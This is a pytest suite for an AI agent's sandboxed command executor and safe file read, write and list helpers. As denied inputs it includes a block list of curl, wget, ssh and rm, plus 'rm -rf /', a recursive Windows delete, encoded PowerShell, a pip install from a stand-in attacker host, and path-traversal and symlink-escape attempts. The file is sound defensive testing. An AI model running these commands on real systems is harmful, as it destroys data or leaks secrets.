"""Tests for the sandbox executor and filesystem primitives.

Each test encodes an independent safety or correctness rule. No implementation mirrors.
"""

from __future__ import annotations

import asyncio
import os
import tempfile
from pathlib import Path

import pytest

from app.sandbox import (
    CommandDenied,
    PathOutsideProject,
    ProcessSandboxExecutor,
    safe_list,
    safe_read,
    safe_write,
)


# ---- Command executor: denial rules -----------------------------------------


def test_executor_denies_previously_dangerous_commands() -> None:
    """Guard against regressions: these commands were considered and deliberately NOT added
    to the whitelist because they can bypass path boundaries or are destructive.
    If someone adds them back, these tests fail and force a conversation."""
    with tempfile.TemporaryDirectory() as tmp:
        ex = ProcessSandboxExecutor(tmp)
        for cmd in ("find", "cp", "mv", "rm", "rmdir", "curl", "wget", "ssh"):
            with pytest.raises(CommandDenied):
                asyncio.run(ex.run([cmd, "--help"]))


def test_executor_denies_unknown_command() -> None:
    """A command not on the whitelist must be refused before execution."""
    with tempfile.TemporaryDirectory() as tmp:
        ex = ProcessSandboxExecutor(tmp)
        with pytest.raises(CommandDenied):
            asyncio.run(ex.run(["rm", "-rf", "/"]))


def test_executor_denies_absolute_path_to_command() -> None:
    """Even if the target would be on the whitelist, invoking via absolute path is denied —
    otherwise the whitelist could be bypassed with /usr/bin/<cmd>."""
    with tempfile.TemporaryDirectory() as tmp:
        ex = ProcessSandboxExecutor(tmp)
        with pytest.raises(CommandDenied):
            asyncio.run(ex.run(["/bin/echo", "hi"]))


def test_executor_denies_relative_path_to_command() -> None:
    """Same rule, but for relative-path invocation like `./script.sh`."""
    with tempfile.TemporaryDirectory() as tmp:
        ex = ProcessSandboxExecutor(tmp)
        with pytest.raises(CommandDenied):
            asyncio.run(ex.run(["./malicious", "--do-stuff"]))


def test_executor_denies_empty_command() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        ex = ProcessSandboxExecutor(tmp)
        with pytest.raises(CommandDenied):
            asyncio.run(ex.run([]))


def test_executor_denies_git_network_subcommands() -> None:
    """git push/pull/fetch/clone/remote must be denied even though `git` is allowed.
    This is the rule that keeps the Coder from pushing unreviewed commits to origin."""
    with tempfile.TemporaryDirectory() as tmp:
        ex = ProcessSandboxExecutor(tmp)
        for sub in ("push", "pull", "fetch", "clone", "remote"):
            with pytest.raises(CommandDenied):
                asyncio.run(ex.run(["git", sub]))


def test_executor_denies_pip_custom_index() -> None:
    """Installing from a custom index URL could exfiltrate or pull malicious packages."""
    with tempfile.TemporaryDirectory() as tmp:
        ex = ProcessSandboxExecutor(tmp)
        with pytest.raises(CommandDenied):
            asyncio.run(
                ex.run(["pip", "install", "--index-url", "http://attacker.example", "foo"])
            )


# ---- Windows shells: narrow allowed shape ---------------------------------
#
# cmd and powershell are on the allowlist so the Reviewer can run .bat/.ps1
# files on Windows projects. They are restricted by argv shape — only the
# narrow "launch a project-relative script" form is permitted. These tests
# pin both directions: allowed shapes pass validation; dangerous shapes
# (inline commands, absolute paths, -Command, parent-traversal) are denied.
#
# Validation runs before subprocess.exec, so these tests are platform-
# independent — they exercise CommandDenied logic, not actual shell behavior.


def test_executor_allows_cmd_to_run_bat_file() -> None:
    """The reason cmd is on the allowlist at all: Reviewer must run run.bat
    to verify Windows projects."""
    from app.sandbox.executor import _validate_windows_shell_args
    # Validator should accept; we don't actually run the bat (no Windows here)
    _validate_windows_shell_args(["cmd", "/c", "run.bat"])
    _validate_windows_shell_args(["cmd.exe", "/c", "scripts\\build.bat"])
    _validate_windows_shell_args(["cmd", "/c", "run.bat", "arg1", "arg2"])


def test_executor_allows_powershell_to_run_ps1_file() -> None:
    from app.sandbox.executor import _validate_windows_shell_args
    _validate_windows_shell_args(["powershell", "-File", "run.ps1"])
    _validate_windows_shell_args(
        ["powershell.exe", "-NoProfile", "-File", "scripts/build.ps1"]
    )
    _validate_windows_shell_args(
        ["powershell", "-ExecutionPolicy", "Bypass", "-NoProfile", "-File", "build.ps1"]
    )


def test_executor_denies_cmd_inline_command() -> None:
    """The dangerous form: cmd /c "<arbitrary command>". Without this guard,
    `cmd /c "rm -rf C:\\"` would be allowed because cmd is on the list."""
    from app.sandbox.executor import _validate_windows_shell_args
    with pytest.raises(CommandDenied):
        _validate_windows_shell_args(["cmd", "/c", "echo hello"])
    with pytest.raises(CommandDenied):
        _validate_windows_shell_args(["cmd", "/c", "del /q /s C:\\"])


def test_executor_denies_powershell_inline_command() -> None:
    """The PowerShell equivalent: -Command and -EncodedCommand are blocked
    because they take arbitrary script as a string."""
    from app.sandbox.executor import _validate_windows_shell_args
    with pytest.raises(CommandDenied):
        _validate_windows_shell_args(["powershell", "-Command", "Get-Process"])
    with pytest.raises(CommandDenied):
        _validate_windows_shell_args(
            ["powershell", "-EncodedCommand", "ZQBjAGgAbwAgAGgA"]
        )
    with pytest.raises(CommandDenied):
        _validate_windows_shell_args(["powershell.exe", "-c", "Remove-Item -Recurse"])


def test_executor_denies_cmd_absolute_script_path() -> None:
    """Absolute paths bypass project containment. Block them at validation."""
    from app.sandbox.executor import _validate_windows_shell_args
    with pytest.raises(CommandDenied):
        _validate_windows_shell_args(["cmd", "/c", "C:\\Windows\\System32\\evil.bat"])
    with pytest.raises(CommandDenied):
        _validate_windows_shell_args(["cmd", "/c", "/etc/passwd"])


def test_executor_denies_cmd_parent_traversal_in_script_path() -> None:
    from app.sandbox.executor import _validate_windows_shell_args
    with pytest.raises(CommandDenied):
        _validate_windows_shell_args(["cmd", "/c", "..\\..\\escape.bat"])
    with pytest.raises(CommandDenied):
        _validate_windows_shell_args(["powershell", "-File", "../../escape.ps1"])


def test_executor_denies_cmd_non_script_file() -> None:
    """If it doesn't end in .bat/.cmd/.ps1, it's not a script — likely an
    inline command being smuggled past the script-path check."""
    from app.sandbox.executor import _validate_windows_shell_args
    with pytest.raises(CommandDenied):
        _validate_windows_shell_args(["cmd", "/c", "run.exe"])
    with pytest.raises(CommandDenied):
        _validate_windows_shell_args(["powershell", "-File", "script.txt"])


def test_executor_denies_cmd_with_no_args() -> None:
    """cmd or powershell with no script to run is just an interactive shell —
    deny that explicitly."""
    from app.sandbox.executor import _validate_windows_shell_args
    with pytest.raises(CommandDenied):
        _validate_windows_shell_args(["cmd"])
    with pytest.raises(CommandDenied):
        _validate_windows_shell_args(["powershell"])


def test_executor_denies_cmd_via_run_method() -> None:
    """End-to-end: ProcessSandboxExecutor.run() rejects the dangerous shapes
    too, not just the validator in isolation. Catches wiring regressions
    where someone bypasses the validator call."""
    with tempfile.TemporaryDirectory() as tmp:
        ex = ProcessSandboxExecutor(tmp)
        with pytest.raises(CommandDenied):
            asyncio.run(ex.run(["cmd", "/c", "echo dangerous"]))
        with pytest.raises(CommandDenied):
            asyncio.run(ex.run(["powershell", "-Command", "Get-Process"]))


# ---- Playwright CLI: install-only allowance ---------------------------------
#
# `playwright` is on the allowlist so the Reviewer can bootstrap its own
# Chromium when playwright_check returns 'playwright_not_installed'. Other
# subcommands (codegen, test, show-trace) are blocked — they need a UI, can
# hang indefinitely, or take arbitrary file paths.


def test_executor_allows_playwright_install() -> None:
    """The reason playwright is on the allowlist: Reviewer installs Chromium."""
    with tempfile.TemporaryDirectory() as tmp:
        ex = ProcessSandboxExecutor(tmp)
        # Validation should pass (we don't actually run; shutil.which may
        # return None which the executor handles cleanly).
        # We test by reaching past the CommandDenied gate.
        try:
            asyncio.run(ex.run(["playwright", "install"], timeout_seconds=1))
        except CommandDenied:
            pytest.fail("playwright install should not raise CommandDenied")
        try:
            asyncio.run(ex.run(["playwright", "install", "chromium"], timeout_seconds=1))
        except CommandDenied:
            pytest.fail("playwright install chromium should not raise CommandDenied")
        try:
            asyncio.run(ex.run(["playwright", "--version"], timeout_seconds=1))
        except CommandDenied:
            pytest.fail("playwright --version should not raise CommandDenied")


def test_executor_denies_playwright_codegen() -> None:
    """codegen opens a browser GUI and waits indefinitely — bad for sandbox."""
    with tempfile.TemporaryDirectory() as tmp:
        ex = ProcessSandboxExecutor(tmp)
        with pytest.raises(CommandDenied):
            asyncio.run(ex.run(["playwright", "codegen", "https://example.com"]))


def test_executor_denies_playwright_test() -> None:
    """`playwright test` runs an arbitrary test config — not what we want
    from a sandboxed agent."""
    with tempfile.TemporaryDirectory() as tmp:
        ex = ProcessSandboxExecutor(tmp)
        with pytest.raises(CommandDenied):
            asyncio.run(ex.run(["playwright", "test"]))


def test_executor_denies_playwright_install_with_random_arg() -> None:
    """`playwright install evil.tar.gz` shouldn't work — only browser names."""
    with tempfile.TemporaryDirectory() as tmp:
        ex = ProcessSandboxExecutor(tmp)
        with pytest.raises(CommandDenied):
            asyncio.run(ex.run(["playwright", "install", "evil.tar.gz"]))


def test_executor_denies_bare_playwright() -> None:
    """`playwright` alone is interactive; require a subcommand."""
    with tempfile.TemporaryDirectory() as tmp:
        ex = ProcessSandboxExecutor(tmp)
        with pytest.raises(CommandDenied):
            asyncio.run(ex.run(["playwright"]))


# ---- Command executor: behavior --------------------------------------------


def test_executor_runs_allowed_command_and_captures_output() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        ex = ProcessSandboxExecutor(tmp)
        result = asyncio.run(ex.run(["echo", "hello from sandbox"]))
        assert result.exit_code == 0
        assert "hello from sandbox" in result.stdout
        assert not result.timed_out


def test_executor_working_directory_is_project_root() -> None:
    """Commands must run inside the project root, not wherever the backend process is."""
    with tempfile.TemporaryDirectory() as tmp:
        project = Path(tmp) / "proj"
        project.mkdir()
        (project / "marker.txt").write_text("x")

        ex = ProcessSandboxExecutor(project)
        # `ls` should see our marker file
        result = asyncio.run(ex.run(["ls"]))
        assert result.exit_code == 0
        assert "marker.txt" in result.stdout


def test_executor_times_out_runaway_process() -> None:
    """A command that exceeds the timeout must be killed and reported as timed_out."""
    with tempfile.TemporaryDirectory() as tmp:
        ex = ProcessSandboxExecutor(tmp)
        # Sleep for 60s but time out in 2s. Use python which is on the whitelist.
        result = asyncio.run(
            ex.run(["python", "-c", "import time; time.sleep(60)"], timeout_seconds=2)
        )
        assert result.timed_out is True
        assert result.exit_code is None
        # Should have taken ~2s, not 60s
        assert result.duration_ms < 10_000


def test_executor_truncates_large_stdout() -> None:
    """Runaway processes that flood stdout must be bounded, not OOM the backend."""
    with tempfile.TemporaryDirectory() as tmp:
        ex = ProcessSandboxExecutor(tmp)
        # Print 200KB — should be truncated to 50KB
        result = asyncio.run(
            ex.run(
                [
                    "python",
                    "-c",
                    "import sys; sys.stdout.write('x' * 200000)",
                ],
                timeout_seconds=10,
            )
        )
        assert result.stdout_truncated is True
        assert len(result.stdout.encode("utf-8")) < 60_000  # 50k cap + truncation note
        assert "truncated" in result.stdout.lower()


def test_executor_strips_sensitive_env_vars() -> None:
    """Parent-process env vars like ANTHROPIC_API_KEY must NOT leak into subprocess env."""
    with tempfile.TemporaryDirectory() as tmp:
        ex = ProcessSandboxExecutor(tmp)
        os.environ["ANTHROPIC_API_KEY"] = "sk-ant-this-should-not-leak"
        try:
            result = asyncio.run(
                ex.run(
                    [
                        "python",
                        "-c",
                        "import os; print(os.environ.get('ANTHROPIC_API_KEY', 'MISSING'))",
                    ],
                    timeout_seconds=5,
                )
            )
            assert result.exit_code == 0
            assert "MISSING" in result.stdout
            assert "sk-ant-this-should-not-leak" not in result.stdout
        finally:
            del os.environ["ANTHROPIC_API_KEY"]


def test_executor_handles_missing_binary_gracefully() -> None:
    """If a whitelisted command isn't installed, we must get a clean error, not a crash."""
    with tempfile.TemporaryDirectory() as tmp:
        # Put a totally unheard-of command on the whitelist temporarily
        ex = ProcessSandboxExecutor(tmp, allowed_commands=frozenset({"this-does-not-exist-xyzzy"}))
        result = asyncio.run(ex.run(["this-does-not-exist-xyzzy"]))
        assert result.exit_code is None
        assert "not found" in result.stderr.lower()


def test_executor_rejects_invalid_project_root() -> None:
    with pytest.raises(ValueError):
        ProcessSandboxExecutor("/this/path/does/not/exist/anywhere")


# ---- Filesystem: safe_read --------------------------------------------------


def test_fs_read_reads_file_inside_project() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        (root / "hello.txt").write_text("world", encoding="utf-8")
        result = safe_read(root, "hello.txt")
        assert result.content == "world"
        assert not result.truncated


def test_fs_read_refuses_absolute_path_outside_project() -> None:
    """An absolute path pointing outside the project must raise, not read."""
    with tempfile.TemporaryDirectory() as tmp_a, tempfile.TemporaryDirectory() as tmp_b:
        root = Path(tmp_a)
        outside = Path(tmp_b) / "secret.txt"
        outside.write_text("top secret", encoding="utf-8")
        with pytest.raises(PathOutsideProject):
            safe_read(root, str(outside))


def test_fs_read_refuses_parent_directory_escape() -> None:
    """The classic ../../etc/passwd trick must fail."""
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp) / "proj"
        root.mkdir()
        (Path(tmp) / "outside.txt").write_text("not yours", encoding="utf-8")
        with pytest.raises(PathOutsideProject):
            safe_read(root, "../outside.txt")


def test_fs_read_refuses_symlink_escape() -> None:
    """A symlink inside the project that points outside must not be readable."""
    if os.name == "nt":
        pytest.skip("Symlinks on Windows require admin; skipping")
    with tempfile.TemporaryDirectory() as tmp_a, tempfile.TemporaryDirectory() as tmp_b:
        root = Path(tmp_a)
        target = Path(tmp_b) / "outside.txt"
        target.write_text("not yours", encoding="utf-8")
        (root / "link").symlink_to(target)
        with pytest.raises(PathOutsideProject):
            safe_read(root, "link")


def test_fs_read_truncates_large_files() -> None:
    """Large files must be capped so an agent can't blow out its context window."""
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        content = "line\n" * 200_000
        (root / "big.txt").write_text(content, encoding="utf-8")
        result = safe_read(root, "big.txt", max_bytes=10_000)
        assert result.truncated is True
        assert result.total_bytes == len(content.encode("utf-8"))
        assert len(result.content.encode("utf-8")) < 15_000


def test_fs_read_raises_on_missing_file() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        with pytest.raises(FileNotFoundError):
            safe_read(Path(tmp), "nope.txt")


def test_fs_read_raises_on_directory() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        (Path(tmp) / "subdir").mkdir()
        with pytest.raises(IsADirectoryError):
            safe_read(Path(tmp), "subdir")


# ---- Filesystem: safe_write -------------------------------------------------


def test_fs_write_creates_file_and_parents() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        safe_write(root, "src/lib/module.py", "x = 1\n")
        assert (root / "src" / "lib" / "module.py").read_text() == "x = 1\n"


def test_fs_write_uses_utf8() -> None:
    """Writes must use UTF-8 — the same bug that killed your Pong plan write."""
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        safe_write(root, "plan.md", "Em-dash — and emoji 🎮")
        # Read raw bytes to confirm encoding
        raw = (root / "plan.md").read_bytes()
        assert raw.decode("utf-8") == "Em-dash — and emoji 🎮"


def test_fs_write_refuses_symlink_escape() -> None:
    """A symlink inside the project that points outside must not be writable —
    otherwise the agent could write outside the project by creating a symlink first.
    Resolution follows the symlink; the resolved target must be inside the project."""
    if os.name == "nt":
        pytest.skip("Symlinks on Windows require admin; skipping")
    with tempfile.TemporaryDirectory() as tmp_a, tempfile.TemporaryDirectory() as tmp_b:
        root = Path(tmp_a)
        # Create a symlink INSIDE the project that points OUTSIDE
        outside_dir = Path(tmp_b)
        (root / "escape").symlink_to(outside_dir)
        with pytest.raises(PathOutsideProject):
            safe_write(root, "escape/leaked.txt", "this should not land outside project")


def test_fs_write_refuses_parent_directory_escape() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp) / "proj"
        root.mkdir()
        with pytest.raises(PathOutsideProject):
            safe_write(root, "../outside.txt", "evil")


def test_fs_write_refuses_absolute_path_outside() -> None:
    with tempfile.TemporaryDirectory() as tmp_a, tempfile.TemporaryDirectory() as tmp_b:
        root = Path(tmp_a)
        with pytest.raises(PathOutsideProject):
            safe_write(root, str(Path(tmp_b) / "leak.txt"), "evil")


# ---- Filesystem: safe_list --------------------------------------------------


def test_fs_list_lists_project_directory() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        (root / "a.txt").write_text("1")
        (root / "b.txt").write_text("22")
        (root / "sub").mkdir()

        entries, truncated = safe_list(root)
        assert not truncated
        names = {e.name for e in entries}
        assert names == {"a.txt", "b.txt", "sub"}

        # Directories should be reported as such with size 0
        sub = next(e for e in entries if e.name == "sub")
        assert sub.is_dir
        assert sub.size_bytes == 0

        # Files should report actual size
        b = next(e for e in entries if e.name == "b.txt")
        assert not b.is_dir
        assert b.size_bytes == 2


def test_fs_list_excludes_hidden_by_default() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        (root / "visible.txt").write_text("x")
        (root / ".hidden").write_text("secret")
        entries, _ = safe_list(root)
        names = {e.name for e in entries}
        assert names == {"visible.txt"}


def test_fs_list_truncates_huge_directory() -> None:
    """A directory with 1000+ files must not send all entries back."""
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        for i in range(1500):
            (root / f"f{i}.txt").write_text("")
        entries, truncated = safe_list(root, max_entries=100)
        assert truncated is True
        assert len(entries) == 100


def test_fs_list_truncation_counts_visible_entries_not_iteration() -> None:
    """Regression: if a directory has many hidden files and a few visible ones, the
    hidden files must NOT consume the truncation budget. We count visible entries only."""
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        # 50 hidden files
        for i in range(50):
            (root / f".hidden{i}").write_text("")
        # 5 visible files
        for i in range(5):
            (root / f"visible{i}.txt").write_text("")
        # With max_entries=10 and hidden filtering on: should get all 5 visible, not 0
        entries, truncated = safe_list(root, max_entries=10, include_hidden=False)
        assert not truncated
        assert len(entries) == 5
        assert all(not e.name.startswith(".") for e in entries)


def test_fs_list_refuses_parent_directory_escape() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp) / "proj"
        root.mkdir()
        with pytest.raises(PathOutsideProject):
            safe_list(root, "../")
